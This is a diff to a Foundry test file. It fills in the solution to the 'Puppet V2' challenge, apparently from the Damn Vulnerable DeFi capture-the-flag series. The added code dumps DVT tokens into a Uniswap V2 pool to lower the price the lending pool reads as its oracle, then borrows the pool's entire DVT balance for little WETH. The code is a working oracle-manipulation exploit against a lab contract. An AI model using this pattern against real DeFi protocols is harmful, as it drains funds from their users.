@@ -97,7 +97,29 @@ contract PuppetV2Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV2() public checkSolvedByPlayer {}
+    function test_puppetV2() public checkSolvedByPlayer {
+
+        // Swap DVT -> ETH (this makes DVT cheaper as per the uniswapv2 oracle)
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        address[] memory path = new address[](2);
+        path[0] = address(token); // token in 
+        path[1] = address(weth); // token out
+        uniswapV2Router.swapExactTokensForETH(token.balanceOf(player), 9 ether, path, player, block.timestamp);
+
+        // ETH -> WETH
+        weth.deposit{value: player.balance}();
+        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
+
+        // Need this much weth to borrow all the DVT tokens from lending pool
+        uint256 depositOfWethRequired = lendingPool.calculateDepositOfWETHRequired(lendingPoolBalance);
+        weth.approve(address(lendingPool), depositOfWethRequired);
+        
+        // Approval for required weth given, now we borrow all the DVT tokens
+        lendingPool.borrow(lendingPoolBalance);
+        
+        // Send DVT tokens to recovery address
+        token.transfer(recovery, lendingPoolBalance);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
